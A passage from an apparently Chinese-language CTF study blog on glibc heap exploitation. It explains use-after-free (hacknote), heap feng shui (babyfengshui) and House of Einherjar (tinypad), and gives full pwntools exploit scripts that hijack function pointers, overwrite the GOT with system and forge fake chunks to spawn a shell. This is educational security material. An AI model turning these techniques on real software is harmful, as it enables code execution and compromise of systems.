class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print note</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print note content</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后门函数 .text:08048986</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然是一道 UAF 的例题，要把那个函数指针覆盖为 0x08048986，然后 print_note 触发，要注意到一个 node 的大小是 8，然后可以按如下方式操作：</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="Heap-fengshui-babyfengshui"><a href="#Heap-fengshui-babyfengshui" class="headerlink" title="Heap fengshui - babyfengshui"></a>Heap fengshui - babyfengshui</h3><p>Node 大致是这样的：</p><table><thead><tr><th style="text-align:center">Node</th></tr></thead><tbody><tr><td style="text-align:center">char* dect</td><td></td></tr><tr><td style="text-align:center">char name[0x80-sizeof(char*)]</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">char</span> *)(len + users_array[idx]-&gt;dect) &gt;=</span><br><span class="line">    (<span class="keyword">char</span> *)users_array[idx] - <span class="number">4</span> ) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个只能判断 node 和 dect 相邻时，dect 不溢出，可以把他们操作成不相邻的，就绕过这个检测了。</p><p>然后这么操作:</p><ol><li>create 三个 0x80 的 node.</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">node[0] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[0] 0x80</td><td></td></tr></tbody></table><ol start="2"><li>delete node[0].</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">空闲    0x100</td><td></td></tr></tbody></table><ol start="3"><li>再 create 一个 0x100 dect 的 node, 此时 dect 和 node 就不在一起了.</li></ol><table><thead><tr><th style="text-align:center">node</th></tr></thead><tbody><tr><td style="text-align:center">top</td><td></td></tr><tr><td style="text-align:center">node[3] 0x80</td><td></td></tr><tr><td style="text-align:center">node[2] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[2] 0x80</td><td></td></tr><tr><td style="text-align:center">node[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[1] 0x80</td><td></td></tr><tr><td style="text-align:center">dect[3] 0x100</td><td></td></tr></tbody></table><ol start="4"><li>用堆溢出进行操作.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh  = process(<span class="string">'./babyfengshui'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, name, textLen, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size of description:'</span>,str(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,textLen,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk0'</span>, <span class="number">0x80</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk1'</span>, <span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk2'</span>, <span class="number">0x8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'chunk3'</span>, <span class="number">0x19c</span>,</span><br><span class="line">       <span class="string">'c'</span> * <span class="number">0x198</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, free_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 libc 加载地址</span></span><br><span class="line">libc_base   = free_addr - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 free 的 got 表地址为 system 的地址</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">4</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell，相当于 system(heap[2])</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>libc2.26 以上因为有 tcache 机制，使用单项链表维护，先进后出，而且块不会合并。</p><h2 id="2020-2-08"><a href="#2020-2-08" class="headerlink" title="2020-2-08"></a>2020-2-08</h2><h3 id="House-Of-Einherjar-tinypad"><a href="#House-Of-Einherjar-tinypad" class="headerlink" title="House Of Einherjar - tinypad"></a>House Of Einherjar - tinypad</h3><h4 id="回顾-House-Of-Einherjar"><a href="#回顾-House-Of-Einherjar" class="headerlink" title="回顾 House Of Einherjar"></a>回顾 House Of Einherjar</h4><p>两个物理相邻的 chunk 会共享 prev_size 字段，当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。</p><p>在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。这基本就是 House Of Einherjar 的原理。</p><p>利用条件：</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad">题目链接</a></p><p>看代码后可以发现以下几个关键点：</p><ul><li>添加 memo 时，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致，所有存在 off by one 漏洞。</li><li>删除时会根据存储 memo 的大小判断 memo 是否在被使用，将相应 memo 大小设置为 0，但是并没有将指针设置为 NULL，有可能会导致 UAF。在程序开头时，就有可能输出一些相关的内容，这里可以泄露基址。</li><li>编辑时 copy 存在 off by one。</li></ul><p>利用基本思路如下：</p><ol><li>利用删除时没有将指针置为 NULL 的 UAF 漏洞，泄漏堆的基地址。</li><li>再次利用 UAF 漏洞泄漏 libc 的基地址。</li><li>利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制 4 个 memo 的指针和内容了。</li><li>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为 one_gadget。所以我们还是需要泄漏 main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出 environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc 中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。</li><li>最后修改 main 函数的返回地址为 one_gadget 地址获取 shell。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">tinypad = ELF(<span class="string">"./tinypad"</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./tinypad"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'a'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(SIZE)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'e'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'(CONTENT)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Is it OK?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(CMD)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'d'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(INDEX)&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak heap base</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)  <span class="comment"># delete idx 1</span></span><br><span class="line">    delete(<span class="number">1</span>)  <span class="comment"># delete idx 0, idx 0 point to idx 1</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)  <span class="comment"># get pointer point to idx1</span></span><br><span class="line">    heap_base = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">'get heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. leak libc base</span></span><br><span class="line">    <span class="comment"># this will trigger malloc_consolidate</span></span><br><span class="line">    <span class="comment"># first idx0 will go to unsorted bin</span></span><br><span class="line">    <span class="comment"># second idx1 will merge with idx0(unlink), and point to idx0</span></span><br><span class="line">    <span class="comment"># third idx1 will merge into top chunk</span></span><br><span class="line">    <span class="comment"># but cause unlink feture, the idx0's fd and bk won't change</span></span><br><span class="line">    <span class="comment"># so idx0 will leak the unsorted bin addr</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    unsorted_offset_arena = <span class="number">8</span> + <span class="number">10</span> * <span class="number">8</span></span><br><span class="line">    main_arena = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - unsorted_offset_arena</span><br><span class="line">    libc_base = main_arena - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. house of einherjar</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span>)  <span class="comment"># idx 0</span></span><br><span class="line">    <span class="comment"># we would like trigger house of einherjar at idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">0xf8</span> + <span class="string">'\x11'</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">0xf8</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'d'</span> * <span class="number">0xf8</span>)  <span class="comment">#idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a fake chunk in tinypad's 0x100 buffer, offset 0x20</span></span><br><span class="line">    tinypad_addr = <span class="number">0x602040</span></span><br><span class="line">    fakechunk_addr = tinypad_addr + <span class="number">0x20</span></span><br><span class="line">    fakechunk_size = <span class="number">0x101</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(</span><br><span class="line">        fakechunk_addr)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite idx 1's prev_size and</span></span><br><span class="line">    <span class="comment"># set minaddr of size to '\x00'</span></span><br><span class="line">    <span class="comment"># idx 0's chunk size is 0x20</span></span><br><span class="line">    diff = heap_base + <span class="number">0x20</span> - fakechunk_addr</span><br><span class="line">    log.info(<span class="string">'diff between idx1 and fakechunk: '</span> + hex(diff))</span><br><span class="line">    <span class="comment"># '\0' padding caused by strcpy</span></span><br><span class="line">    diff_strip = p64(diff).strip(<span class="string">'\0'</span>)</span><br><span class="line">    number_of_zeros = len(p64(diff)) - len(diff_strip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(number_of_zeros + <span class="number">1</span>):</span><br><span class="line">        data = diff_strip.rjust(<span class="number">0x18</span> - i, <span class="string">'f'</span>)</span><br><span class="line">        edit(<span class="number">1</span>, data)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nDeleted.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fix the fake chunk size, fd and bk</span></span><br><span class="line">    <span class="comment"># fd and bk must be unsorted bin</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena + <span class="number">88</span>) +</span><br><span class="line">         p64(main_arena + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. overwrite malloc_hook with one_gadget</span></span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0x45216</span></span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">    log.info(<span class="string">'one gadget addr: '</span> + hex(one_gadget_addr))</span><br><span class="line">    log.info(<span class="string">'environ pointer addr: '</span> + 